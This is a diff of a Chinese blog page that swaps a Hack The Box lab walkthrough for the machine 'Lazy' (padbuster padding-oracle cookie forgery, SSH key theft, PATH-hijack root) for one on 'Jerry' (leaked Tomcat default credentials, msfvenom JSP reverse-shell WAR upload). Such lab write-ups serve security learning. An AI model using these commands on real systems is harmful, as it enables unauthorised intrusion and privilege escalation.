@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>htb之Lazy | Hexo</title>
+  <title>htb之jerry | Hexo</title>
   <meta name="keywords" content=" 博客 , htb ">
-  <meta name="description" content="htb之Lazy | Hexo">
+  <meta name="description" content="htb之jerry | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Jeevesnmap 收集信息发现开启有80和50000端口，打开80端口，只看见一个搜索框，随便输入几个字符，直接跳出一张图片错误的引导信息，直接去看50000端口还是有点东西的，直接爆破目录爆破出这几个目录，打开可以看到是一个名为jenkins的项目直接去Google找漏洞https://www.hackingarticles.in/exploiting-jenkins-groovy-">
 <meta name="keywords" content="博客,htb">
@@ -314,9 +314,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-htb之Lazy" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之jerry" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">htb之Lazy</h1>
+        <h1 class="article-title">htb之jerry</h1>
     
     <div class="article-meta">
         
@@ -340,7 +340,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-11 17:44:26'>2019-11-11 17:17</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-20 16:11:00'>2019-11-20 15:36</time>
         
     </div>
     <div class="article-meta">
@@ -362,7 +362,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Lazy"><span class="toc-text">htb之Lazy</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之jerry"><span class="toc-text">htb之jerry</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -378,24 +378,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="htb之Lazy"><a href="#htb之Lazy" class="headerlink" title="htb之Lazy"></a>htb之Lazy</h1><p>nmap 收集信息<br><img src="/images/lazy/1.1.png" alt></p>
-<p>只有一个登陆框，创建完用户可以看到突出一个auth cookie,我将拦截请求发送到转发器，以分析其响应。它提示“无效填充”，这意味着可能存在填充oracle漏洞。<br><img src="/images/lazy/1.2.png" alt></p>
-<p>该命令包含目标URL和上面复制的身份验证cooki</p>
+        <h1 id="htb之jerry"><a href="#htb之jerry" class="headerlink" title="htb之jerry"></a>htb之jerry</h1><p>nmap 收集信息<br><img src="/images/jerry/1.png" alt><br>只开有一个8080端口，发现是一个刚安装好的tomcat，这个漏洞以前遇到过<br>输错几次默认密码之后，后面报错信息直接把账号密码报出来了<br><img src="/images/jerry/2.png" alt><br>直接进入到tomcat管理后台，看到有一个上传点，直接使用msfvenom生成一个shell</p>
 <blockquote>
-<p>padbuster <a href="http://10.10.10.18/login.php" target="_blank" rel="noopener">http://10.10.10.18/login.php</a> wiQgvekCJISpjPseG06S%2FLs18d0QcOgo 8 –cookies auth=wiQgvekCJISpjPseG06S%2FLs18d0QcOgo –encoding 0 -plaintext user=admin</p>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</p>
 </blockquote>
-<p>跑出admin用户cookie之后，直接替换cookie，转换成admin用户<br><img src="/images/lazy/1.png" alt></p>
-<p>转换成admin用户之后，直接就可以看到ssh秘钥，直接连接吧</p>
-<blockquote>
-<p><a href="http://10.10.10.18/mysshkeywithnamemitsos" target="_blank" rel="noopener">http://10.10.10.18/mysshkeywithnamemitsos</a> </p>
-</blockquote>
-<p>从文件名可以直接看出该系统用户名是mitsos<br>ssh -i ssh.txt <a href="mailto:mitsos@10.10.10.18" target="_blank" rel="noopener">mitsos@10.10.10.18</a></p>
-<p>成功获取到user.txt，在该目录下peda和备份文件，在执行备份的时候，可以看到它打印带有用户哈希值的影子文件 </p>
-<blockquote>
-<p>strings backup</p>
-</blockquote>
-<p>使用strings 查看该文件的backup中可打印的字符串，发现有命令包含在里面 cat /etc/shadow</p>
-<p>现在只要我创建一个可执行的cat文件，即可获取root权限<br>cd /tmp<br>echo “/bin/sh” &gt; cat<br>chmod 777 cat<br>export PATH=/tmp:$PATH<br>再回去执行一下备份文件./backup<br>OKroot</p>
+<p><img src="/images/jerry/3.png" alt><br>直接上传shell,并不需要提权直接就是administrator权限</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -405,12 +392,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>htb之Lazy</p>
+    <p><span class="copy-title">文章标题:</span>htb之jerry</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-11, 17:17:42</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-11, 17:44:26</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/11/htb之Lazy/" title="htb之Lazy">https://manmachines.github.io/2019/11/11/htb之Lazy/</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-20, 15:36:04</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-20, 16:11:00</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/20/htb之jerry/" title="htb之jerry">https://manmachines.github.io/2019/11/20/htb之jerry/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
